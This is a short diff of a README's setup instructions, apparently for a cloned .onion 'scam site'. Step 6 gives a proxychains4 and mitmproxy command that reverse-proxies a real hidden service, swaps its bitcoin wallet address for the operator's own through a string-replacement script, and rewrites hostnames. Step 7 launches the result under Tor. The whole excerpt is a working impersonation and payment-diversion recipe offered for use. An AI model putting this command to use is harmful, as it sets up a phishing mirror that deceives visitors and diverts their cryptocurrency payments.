@@ -87,7 +87,7 @@ sudo cp torrc /etc/tor/torrc
 6. Run `proxychains` and whatever `mitmproxy` script you want (E.g., this one replaces TDS bitcoin wallet with bitcoin wallet for tunapanda.org):
 
   ```
-proxychains4 mitmproxy -p 20080 -R http://dstormer6em3i4km.onion --anticache -s "replace_string.py 19m9yEChBSPuzCzEMmg1dNbPvdLdWA59rS 1CU5YgjquupDw6UeXEyA9VEBH34R7fZ19b"
+proxychains4 mitmproxy -p 20080 -R http://dstormer6em3i4km.onion --anticache -s "replace_string.py 19m9yEChBSPuzCzEMmg1dNbPvdLdWA59rS 1CU5YgjquupDw6UeXEyA9VEBH34R7fZ19b" --replace ":~hq .:<<<your-hostname>>>.onion:dstormer6em3i4km.onion"
   ```
 
 7. Finally, run `tor` to run your dstormer--------.onion scam site.
